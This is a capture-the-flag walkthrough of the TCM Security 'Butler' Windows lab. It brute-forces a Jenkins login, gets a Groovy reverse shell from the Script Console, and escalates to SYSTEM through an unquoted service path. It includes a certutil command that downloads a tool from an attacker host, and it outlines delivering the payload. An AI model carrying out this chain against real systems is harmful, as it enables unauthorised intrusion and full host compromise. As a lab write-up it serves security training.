# TCM Butler — CTF Writeup

**Platform:** TCM Security  
**Full Walkthrough (with screenshots):** [Read on Medium](https://medium.com/@olamideoyek/tcm-butler-walkthrough-08cd099d2e39)

---

## Overview

A Windows-based machine featuring a Jenkins instance exposed on a non-standard port. Credentials were brute-forced via Burp Suite Intruder, giving access to the Jenkins Script Console for a Groovy-based reverse shell. Privilege escalation was achieved by abusing an **unquoted service path** vulnerability in a third-party Windows service.

---

## Attack Chain Summary

```
Host IP (ipconfig) → Nmap Scan → SMB/Port 5040 Dead Ends
→ Jenkins Discovery (Port 8080) → Burp Suite Intruder (Cluster Bomb Brute-Force)
→ Jenkins Login → Groovy Script Console RCE → Reverse Shell
→ WinPEAS → Unquoted Service Path (Wise Boot Assistant)
→ Malicious Executable Drop → Service Restart → SYSTEM Shell
```

---

## Step 1 — Host Discovery

```cmd
ipconfig
```

Since login credentials were provided directly for the box, `ipconfig` was run locally on the machine to confirm its assigned IP address.

---

## Step 2 — Port Scanning & Enumeration

```bash
nmap <target-ip>
```

**Findings:**

| Port | Service | Notes |
|------|---------|-------|
| 445 | SMB | `smbclient` returned **Permission Denied** — no accessible shares |
| 5040 | Unknown | Banner-grabbing via Netcat/Nmap returned no useful data |
| 8080 | HTTP | **Jenkins login page** discovered |

---

## Step 3 — Jenkins Credential Brute-Force (Burp Suite)

Research into Jenkins exploitation techniques surfaced a known technique: using **Groovy Script Console** for remote code execution once authenticated.

### Capture the Login Request
Burp Suite's proxy was used to intercept the POST request sent when logging in, revealing the parameter structure:

```
j_username=admin
password=password
```

### Configure Intruder — Cluster Bomb Attack
1. Sent the captured request to **Intruder**
2. Cleared existing payload markers
3. Marked the `j_username` and `password` values as payload positions
4. Set attack type to **Cluster Bomb**
5. Loaded custom username/password wordlists built from information gathered during enumeration and research

### Identify Valid Credentials
A custom **Grep - Match** rule was configured to flag responses containing `"Invalid"` with a value of `1`. Any response **without** this flag indicated a successful login attempt.

**Result:** Valid credentials found — `jenkins:jenkins`

---

## Step 4 — Exploitation (Jenkins Script Console RCE)

Logged in to Jenkins using the recovered credentials (`jenkins:jenkins`).

### Groovy Reverse Shell
Navigated to **Manage Jenkins → Script Console** and used a known Groovy reverse shell payload:

🔗 [gist.github.com/frohoff/fed1ffaab9b9beeb1c76](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

**Steps:**
1. Edited the payload's IP address to match the attacking (Kali) machine
2. Set up a listener using Netcat or Metasploit's `multi/handler`
3. Executed the payload via **Run**

**Result:** Reverse shell connection established.

---

## Step 5 — Post-Exploitation Enumeration (WinPEAS)

### Transfer WinPEAS to Target
`Certutil` (a built-in Windows PKI management utility) was used to transfer `winPEAS.exe` from the attacker machine to the target, avoiding the need for additional tooling.

```cmd
certutil -urlcache -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
winPEAS.exe
```

**Key Finding:** An **unquoted service path** vulnerability was flagged.

```powershell
Get-Service *Wise*

Status   Name               DisplayName
------   ----               -----------
Running  WiseBootAssistant  Wise Boot Assistant
```

**Vulnerable Service Path:**
```
C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe
```

Because the path contains spaces and is unquoted, Windows searches each directory segment in order for an executable — meaning a malicious binary placed earlier in the path (e.g. `C:\Program Files (x86)\Wise\`) executes instead of the intended one, provided the attacker has write access.

---

## Step 6 — Privilege Escalation (Unquoted Service Path)

### Deliver the Payload
Generated a malicious executable and transferred it into the vulnerable directory using `certutil`, matching the naming Windows would resolve first in the unquoted path.

### Trigger Execution
```powershell
# Stop and restart the vulnerable service
Stop-Service WiseBootAssistant
Start-Service WiseBootAssistant
```

With a listener running (Netcat or Meterpreter) before restarting the service, the malicious executable ran in place of the legitimate binary — executing with the **privileges of the service**.

**Result: SYSTEM-level shell obtained.**

---

## Key Findings Summary

| Phase | Finding | Impact |
|-------|---------|--------|
| Port 8080 | Exposed Jenkins login | Entry point for brute-force |
| Burp Intruder | Weak Jenkins credentials (`jenkins:jenkins`) | Authenticated access |
| Script Console | Groovy RCE | Initial foothold / reverse shell |
| WinPEAS | Unquoted service path (`WiseBootAssistant`) | Privilege escalation to SYSTEM |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `ipconfig` | Local host IP identification |
| `nmap` | Port scanning & service enumeration |
| `smbclient` | SMB share enumeration (dead end) |
| Burp Suite (Intruder) | Cluster bomb credential brute-force |
| Jenkins Script Console (Groovy) | Remote code execution |
| Netcat / Metasploit `multi/handler` | Reverse shell listener |
| `certutil` | File transfer (attacker → target) |
| WinPEAS | Automated Windows privilege escalation enumeration |

---

## Key Takeaways

- **Exposed Jenkins instances** with default or weak credentials remain a common and high-impact finding — the Script Console provides direct RCE once authenticated.
- **Burp Suite Intruder's Cluster Bomb** mode is effective for testing multiple username/password combinations when a login form doesn't rate-limit attempts.
- **`certutil`** is a reliable living-off-the-land technique for transferring files onto a Windows target without needing additional tooling.
- **Unquoted service paths** remain a classic and reliable Windows privilege escalation vector — always check `wmic service` or WinPEAS output for services with spaces in unquoted paths.
- Always verify a listener is active **before** restarting a service you're targeting for payload execution — timing matters.

---

> ⚠️ **Disclaimer:** This walkthrough was performed in an isolated lab environment for educational purposes only.
